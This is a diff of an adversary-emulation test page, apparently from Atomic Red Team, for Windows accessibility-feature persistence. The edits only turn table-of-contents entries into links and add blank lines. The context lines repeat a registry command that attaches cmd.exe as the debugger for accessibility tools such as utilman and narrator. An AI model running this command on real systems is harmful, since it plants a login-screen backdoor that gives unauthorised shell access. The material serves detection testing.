@@ -27,15 +27,15 @@ Other accessibility features exist that may also be leveraged in a similar fashi
 
 - [Atomic Test #2 - Attaches Command Prompt As Debugger To Process - sethc](#atomic-test-2---attaches-command-prompt-as-debugger-to-process---sethc)
 
-- Atomic Test #3 - Attaches Command Prompt As Debugger To Process - utilman
+- [Atomic Test #3 - Attaches Command Prompt As Debugger To Process - utilman](#atomic-test-3---attaches-command-prompt-as-debugger-to-process---utilman)
 
-- Atomic Test #4 - Attaches Command Prompt As Debugger To Process - magnify
+- [Atomic Test #4 - Attaches Command Prompt As Debugger To Process - magnify](#atomic-test-4---attaches-command-prompt-as-debugger-to-process---magnify)
 
-- Atomic Test #5 - Attaches Command Prompt As Debugger To Process - narrator
+- [Atomic Test #5 - Attaches Command Prompt As Debugger To Process - narrator](#atomic-test-5---attaches-command-prompt-as-debugger-to-process---narrator)
 
-- Atomic Test #6 - Attaches Command Prompt As Debugger To Process - DisplaySwitch
+- [Atomic Test #6 - Attaches Command Prompt As Debugger To Process - DisplaySwitch](#atomic-test-6---attaches-command-prompt-as-debugger-to-process---displayswitch)
 
-- Atomic Test #7 - Attaches Command Prompt As Debugger To Process - AtBroker
+- [Atomic Test #7 - Attaches Command Prompt As Debugger To Process - AtBroker](#atomic-test-7---attaches-command-prompt-as-debugger-to-process---atbroker)
 
 
 ## Atomic Test #1 - Attaches Command Prompt As Debugger To Process - osk
@@ -109,6 +109,7 @@ This allows adversaries to execute the attached process
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
 ```
 
+
 ## Atomic Test #5 - Attaches Command Prompt As Debugger To Process - narrator
 This allows adversaries to execute the attached process
 
@@ -126,6 +127,7 @@ This allows adversaries to execute the attached process
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
 ```
 
+
 ## Atomic Test #6 - Attaches Command Prompt As Debugger To Process - DisplaySwitch
 This allows adversaries to execute the attached process
 
@@ -142,6 +144,7 @@ This allows adversaries to execute the attached process
 ```
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
 ```
+
 
 ## Atomic Test #7 - Attaches Command Prompt As Debugger To Process - AtBroker
 This allows adversaries to execute the attached process
